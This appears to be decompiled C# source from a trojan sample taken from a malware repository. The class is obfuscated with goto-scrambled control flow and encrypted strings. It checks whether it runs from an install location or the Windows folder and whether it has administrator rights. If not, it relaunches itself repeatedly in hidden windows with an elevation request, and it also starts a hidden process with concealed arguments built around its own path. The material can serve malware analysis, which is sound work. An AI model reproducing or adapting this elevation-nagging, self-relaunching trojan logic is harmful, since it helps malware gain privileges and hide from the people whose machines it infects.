// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Jbkttgjy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2A819A-CCD1-40A6-A838-713DABA6E2A0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-Trojan.Multi.GenericML.xnet-ba0fec15d6c5e15df9fd3ac351711716a58c081b27b0f60fa90a77affd84a123.exe

using Jbkttgjy;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

internal static class \u0003\u2002
{
  private static FileInfo \u0002;

  internal static FileInfo \u0002()
  {
    int num = \u0003\u2002.\u0002 == null ? 1 : 0;
    if (true)
      goto label_2;
label_1:
    bool flag;
    if (flag)
    {
      FileInfo fileInfo = new FileInfo(Process.GetCurrentProcess().MainModule.FileName);
      if (true)
        \u0003\u2002.\u0002 = fileInfo;
    }
    FileInfo fileInfo1 = \u0003\u2002.\u0002;
    if (true)
      goto label_7;
label_6:
    FileInfo fileInfo2;
    return fileInfo2;
label_7:
    fileInfo2 = fileInfo1;
    goto label_6;
label_2:
    flag = num != 0;
    goto label_1;
  }

  internal static bool \u0002()
  {
    bool flag1;
    try
    {
      int num1 = Liynqzii.\u0002().\u0002().\u0002() ? 1 : 0;
      if (true)
        goto label_2;
label_1:
      bool flag2;
      if (flag2)
      {
        int num2 = Liynqzii.\u0002().FullName.ToLower() == \u0003\u2002.\u0002().FullName.ToLower() ? 1 : 0;
        if (true)
          goto label_5;
label_4:
        bool flag3;
        if (flag3)
        {
          if (true)
          {
            flag1 = true;
            goto label_10;
          }
          else
            goto label_10;
        }
        else
          goto label_9;
label_5:
        flag3 = num2 != 0;
        goto label_4;
      }
      else
        goto label_9;
label_2:
      flag2 = num1 != 0;
      goto label_1;
    }
    catch
    {
    }
label_9:
    flag1 = false;
label_10:
    return flag1;
  }

  internal static bool \u0003()
  {
    bool flag1;
    try
    {
      string lower = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows)).ToLower();
      if (true)
        goto label_3;
label_1:
      string str;
      int num = \u0003\u2002.\u0002().FullName.ToLower().Contains(str) ? 1 : 0;
      if (true)
        goto label_4;
label_2:
      bool flag2;
      if (flag2)
      {
        if (true)
        {
          flag1 = true;
          goto label_9;
        }
        else
          goto label_9;
      }
      else
        goto label_8;
label_4:
      flag2 = num != 0;
      goto label_2;
label_3:
      str = lower;
      goto label_1;
    }
    catch
    {
    }
label_8:
    flag1 = false;
label_9:
    return flag1;
  }

  internal static void \u0002()
  {
    int num = \u0003\u2002.\u0003() ? 1 : 0;
    if (true)
      goto label_3;
label_1:
    bool flag;
    if (flag)
      return;
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.Arguments = \u0008\u2006.\u0002(2093218446) + \u0003\u2002.\u0002().FullName + \u0008\u2006.\u0002(2093218419);
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.CreateNoWindow = true;
    processStartInfo.ErrorDialog = false;
    processStartInfo.FileName = \u0008\u2006.\u0002(2093218370);
    if (true)
      goto label_6;
label_5:
    ProcessStartInfo startInfo;
    Process.Start(startInfo);
    return;
label_6:
    startInfo = processStartInfo;
    goto label_5;
label_3:
    flag = num != 0;
    goto label_1;
  }

  internal static bool \u0005()
  {
    int num = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? 1 : 0;
    if (true)
      goto label_2;
label_1:
    bool flag;
    return flag;
label_2:
    flag = num != 0;
    goto label_1;
  }

  internal static void \u0003()
  {
    int num = \u0003\u2002.\u0002() || \u0003\u2002.\u0003() ? 1 : (\u0003\u2002.\u0005() ? 1 : 0);
    if (true)
      goto label_2;
label_1:
    bool flag;
    if (flag)
      return;
    while (true)
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          FileName = \u0008\u2006.\u0002(2093218387),
          Arguments = \u0008\u2006.\u0002(2093218341) + \u0003\u2002.\u0002().FullName + \u0008\u2006.\u0002(2093218353),
          WindowStyle = ProcessWindowStyle.Hidden,
          Verb = \u0008\u2006.\u0002(2093218304),
          UseShellExecute = true
        });
        if (false)
          return;
        \u0003\u2002.\u0005();
        return;
      }
      catch
      {
      }
    }
label_2:
    flag = num != 0;
    goto label_1;
  }

  internal static void \u0005()
  {
    if (true)
      goto label_3;
label_1:
    if (true)
      goto label_4;
label_2:
    Process.GetCurrentProcess().Kill();
    return;
label_4:
    Environment.Exit(0);
    goto label_2;
label_3:
    \u0005\u2002.\u0003();
    goto label_1;
  }

  internal static bool \u0002(string _param0)
  {
    int num = \u0005\u2005.\u0002(\u0003\u2002.\u0002().FullName, _param0, false) ? 1 : 0;
    if (true)
      goto label_2;
label_1:
    bool flag;
    return flag;
label_2:
    flag = num != 0;
    goto label_1;
  }
}
